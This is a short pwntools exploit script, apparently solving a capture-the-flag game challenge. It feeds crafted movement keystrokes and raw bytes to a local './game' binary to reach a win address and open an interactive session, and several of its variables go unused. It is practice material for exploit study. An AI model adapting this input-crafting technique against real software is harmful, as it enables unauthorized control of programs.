from pwn import *
p = process('./game')
auto_win = b'wwwwwaaaaaaasawddddddddds'
completions = b'l\x04ddaa'
win = 0x80497bc
payload = auto_win + completions 

up = b'w' * 29

level = b'wd' + up + b'l\x05aaaaaaap'

payload = (b'l\x05') + (b'w' * 5) + (b'a' * 6) + (b's') + (b'a' * (5)) + (b'w') + (b'd' * 6) + (b's') * 2

p.sendline(payload)
p.interactive()
